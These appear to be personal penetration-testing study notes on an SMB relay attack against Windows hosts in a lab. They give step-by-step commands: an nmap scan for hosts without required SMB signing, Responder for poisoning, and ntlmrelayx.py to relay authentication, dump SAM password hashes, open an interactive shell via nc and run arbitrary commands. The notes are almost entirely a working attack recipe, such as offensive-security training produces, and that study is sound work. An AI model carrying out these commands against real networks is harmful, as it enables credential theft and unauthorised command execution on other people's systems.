  
**SMB Relay**
- Step 0: Identify hosts WITHOUT SMB signing
- nmap —script=smb2-security-mode.nse -p445 10.0.0.25
    
    - want to see “Message signing enabled but not required”
    
![[../assets/SMB Relay/Untitled 14.png|Untitled 14.png]]
- Step 1: Run Responder
    
    - For SMB Relay, we want SMB and HTTP to be OFF (unlike LLMNR poisoning)
        
        - this is so the hashes are not just being captured, but are being relayed
        
    
    - sudo responder -I tun0 -dP
    
![[/Untitled 1 3.png|Untitled 1 3.png]]
- Step 2: Set up your relay
    
    - sudo [ntlmrelayx.py](http://ntlmrelayx.py) -tf targets.txt -smb2support
    
![[/Untitled 2 3.png|Untitled 2 3.png]]
- Step 3: An event occurs
![[/Untitled 13.png|Untitled 13.png]]
- Step 4: Win 🙂
    
    - dumps SAM hashes
    
![[/Untitled 3 3.png|Untitled 3 3.png]]
  
Other Wins
- sudo [ntlmrelayx.py](http://ntlmrelayx.py) -tf targets.txt -smb2support -i
    
    - -i gives us an interactive shell
    
- nc 127.0.0.1 11000
- above allows us to look at the SMB shares
- can run commands with “sudo [ntlmrelayx.py](http://ntlmrelayx.py) -tf targets.txt -smb2support -c “whoami”
    
    - don’t need to do this if you’re going to get the SAM dump anyways
    
    - nmap —script=smb2-security-mode.nse -p445 10.0.0.25